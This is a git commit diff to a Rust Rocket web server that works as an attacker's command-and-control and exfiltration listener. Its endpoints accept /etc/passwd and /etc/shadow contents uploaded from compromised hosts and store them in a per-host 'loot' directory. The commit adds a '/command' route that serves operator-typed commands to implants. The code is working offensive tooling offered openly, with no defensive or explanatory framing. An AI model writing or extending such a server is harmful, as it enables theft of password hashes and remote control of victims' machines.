77d549a30be2b41677841087376d2b321988a4a9
Mark Wilkinson <mht197@protonmail.com>
2021-10-28 12:41:01 +0000

    Added some prototypes for sending commands

--- src/main.rs
+++ src/main.rs
@@ -1,26 +1,33 @@
-#[macro_use] extern crate rocket;
+#[macro_use]
+extern crate rocket;
 
-use rocket::{Data, response::Debug, tokio, data::ToByteUnit};
-use std::{io::Error, io::Write, env, fs::File, fs};
+use rocket::{data::ToByteUnit, Data};
+use std::{io, fs, fs::File};
 
 #[get("/")]
 fn index() -> &'static str {
     "Web interface in development, not yet implemented, please use the command line client"
 }
 
+#[get("/command")]
+fn command() -> String {
+    let mut command = String::new();
+    io::stdin().read_line(&mut command).expect("error: unable to read user input");
+    format!("{}", command)
+}
+
 #[post("/post/<hostname>/passwd", format = "plain", data = "<data>")]
 async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
-    
     //create directory and declare location for the passwd file
     let file_location = format!("loot/{}/passwd", hostname);
     println!("File location is {}.", file_location);
 
     let dir = format!("loot/{}", hostname);
-    fs::create_dir_all(&dir);
+    fs::create_dir_all(&dir).ok();
     println!("The dir created is {}.", &dir);
 
-    let mut file = File::create(&file_location)?;
-    let stream = data.open(1.megabytes()).into_file(file_location).await?;
+    let mut _file = File::create(&file_location)?;
+    let _stream = data.open(1.megabytes()).into_file(file_location).await?;
 
     Ok(())
 }
@@ -28,16 +35,19 @@ async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
 #[post("/post/<hostname>/shadow", format = "plain", data = "<data>")]
 async fn shadow(data: Data<'_>, hostname: String) -> std::io::Result<()> {
     let file_location = format!("loot/{}/shadow", hostname);
-    
+
     let dir = format!("loot/{}", hostname);
-    fs::create_dir_all(&dir);
-    
-    let mut file = File::create(&file_location)?;
-    let stream = data.open(1.megabytes()).into_file(file_location).await?;
+    fs::create_dir_all(&dir).ok();
+
+    let mut _file = File::create(&file_location)?;
+    let _stream = data.open(1.megabytes()).into_file(file_location).await?;
     Ok(())
 }
 
 #[launch]
 fn rocket() -> _ {
-    rocket::build().mount("/", routes![index, passwd, shadow])
+    fs::create_dir_all("loot").ok();
+
+    rocket::build().mount("/", routes![index, passwd, shadow, command])
 }
+//
